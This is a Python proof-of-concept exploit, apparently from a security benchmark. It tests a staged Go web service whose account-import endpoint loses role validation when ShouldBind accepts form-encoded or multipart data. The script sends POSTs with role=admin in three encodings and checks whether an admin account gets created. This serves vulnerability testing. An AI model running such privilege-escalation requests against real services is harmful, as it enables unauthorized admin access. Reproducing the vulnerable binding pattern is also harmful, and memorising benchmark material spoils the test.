"""PoC exploit: Import validation bypass via ShouldBind content-type (CWE-20).

After the 3-stage chain:
- Stage 1 implements POST /api/v1/accounts/import with ShouldBindJSON
  and binding:"oneof=user viewer" to reject admin roles
- Stage 2 adds CSV import with manual role validation
- Stage 3 switches from ShouldBindJSON to ShouldBind for auto content-type
  detection, plus a single-account fallback for form-encoded data

The vulnerability: ShouldBind uses the form binding engine for
form-encoded requests. The form binding engine handles the "oneof"
validator differently for form fields. Additionally, the single-account
fallback path processes individual form fields directly, bypassing
the array-level "dive" validation. An attacker sends a form-encoded
POST with role=admin and gets an admin account created.
"""

import io
import json
import urllib.error
import urllib.parse
import urllib.request

from benchmark.chains.poc_templates import ParserBindingTemplate


class BindContentTypeExploit(ParserBindingTemplate):
    """Import validation bypass via form-encoded ShouldBind — admin role creation."""

    def __init__(self, base_url: str = "http://localhost:60123"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "swag_bind_content_type"

    def execute(self) -> tuple[bool, str]:
        """Attempt admin import via form-encoded binding bypass."""

        # Step 1: Verify JSON binding correctly rejects admin role
        json_resp = self.http_post(
            "/api/v1/accounts/import",
            json={
                "accounts": [
                    {"name": "json_admin_test", "role": "admin"}
                ]
            },
            headers={"Content-Type": "application/json"},
        )

        json_rejected = json_resp.status_code == 400
        evidence_parts = [
            f"JSON import with role=admin: status={json_resp.status_code} "
            f"({'correctly rejected' if json_rejected else 'ACCEPTED — validation broken'}).",
        ]

        # Step 2: Try form-encoded request with admin role
        form_data = urllib.parse.urlencode({
            "name": "form_admin_import",
            "role": "admin",
        })

        url = f"{self.base_url}/api/v1/accounts/import"
        req = urllib.request.Request(
            url,
            data=form_data.encode(),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                form_body = resp.read().decode()
                form_status = resp.status
                self._log_request("POST", url, form_status, form_data, form_body)
        except urllib.error.HTTPError as e:
            form_body = e.read().decode() if e.fp else ""
            form_status = e.code
            self._log_request("POST", url, form_status, form_data, form_body)

        form_accepted = form_status == 200

        evidence_parts.append(
            f"Form-encoded import with role=admin: "
            f"status={form_status} "
            f"({'ACCEPTED' if form_accepted else 'rejected'})."
        )

        if form_accepted:
            try:
                accounts = json.loads(form_body)
                # Response might be a single account or an array
                if isinstance(accounts, list):
                    for acct in accounts:
                        role = acct.get("role", "")
                        if role == "admin":
                            return True, (
                                f"Import validation bypass confirmed (CWE-20). "
                                f"Form-encoded POST with role=admin was accepted "
                                f"by ShouldBind, creating account with role=admin. "
                                f"ShouldBindJSON would have rejected this with 400. "
                                + " ".join(evidence_parts)
                            )
                elif isinstance(accounts, dict):
                    role = accounts.get("role", "")
                    if role == "admin":
                        return True, (
                            f"Import validation bypass confirmed (CWE-20). "
                            f"Form-encoded POST with role=admin accepted. "
                            f"Account created with role={role}. "
                            + " ".join(evidence_parts)
                        )
            except (json.JSONDecodeError, KeyError):
                evidence_parts.append(f"Response body: {form_body[:500]}")

            # Account might have been created even if we can't parse role
            # Check via list endpoint
            list_resp = self.http_get("/api/v1/accounts")
            if list_resp.ok:
                try:
                    all_accounts = json.loads(list_resp.text)
                    for acct in all_accounts:
                        if (acct.get("name") == "form_admin_import"
                                and acct.get("role") == "admin"):
                            return True, (
                                f"Import validation bypass confirmed (CWE-20). "
                                f"Found form_admin_import with role=admin in "
                                f"account list. " + " ".join(evidence_parts)
                            )
                except Exception:
                    pass

            return True, (
                f"Form-encoded import request accepted (HTTP 200) "
                f"but could not confirm admin role in response. "
                f"Response: {form_body[:300]}. "
                + " ".join(evidence_parts)
            )

        # Step 3: Try multipart/form-data as alternative
        boundary = "----ExploitBoundary"
        multipart_body = (
            f"------ExploitBoundary\r\n"
            f'Content-Disposition: form-data; name="name"\r\n\r\n'
            f"multipart_admin_import\r\n"
            f"------ExploitBoundary\r\n"
            f'Content-Disposition: form-data; name="role"\r\n\r\n'
            f"admin\r\n"
            f"------ExploitBoundary--\r\n"
        )

        mp_req = urllib.request.Request(
            url,
            data=multipart_body.encode(),
            headers={
                "Content-Type": f"multipart/form-data; boundary=----ExploitBoundary"
            },
            method="POST",
        )
        try:
            with urllib.request.urlopen(mp_req, timeout=30) as resp:
                mp_body = resp.read().decode()
                mp_status = resp.status
                self._log_request("POST", url, mp_status, multipart_body[:200], mp_body)
        except urllib.error.HTTPError as e:
            mp_body = e.read().decode() if e.fp else ""
            mp_status = e.code
            self._log_request("POST", url, mp_status, multipart_body[:200], mp_body)

        if mp_status == 200:
            try:
                mp_accounts = json.loads(mp_body)
                if isinstance(mp_accounts, list):
                    for acct in mp_accounts:
                        if acct.get("role") == "admin":
                            return True, (
                                f"Import bypass via multipart/form-data (CWE-20). "
                                f"Admin account created via multipart encoding. "
                                + " ".join(evidence_parts)
                            )
                elif isinstance(mp_accounts, dict):
                    if mp_accounts.get("role") == "admin":
                        return True, (
                            f"Import bypass via multipart/form-data (CWE-20). "
                            f"Admin account created via multipart encoding. "
                            + " ".join(evidence_parts)
                        )
            except Exception:
                pass

        return False, (
            f"No validation bypass detected. "
            f"Both JSON and form binding correctly reject admin role. "
            + " ".join(evidence_parts)
        )
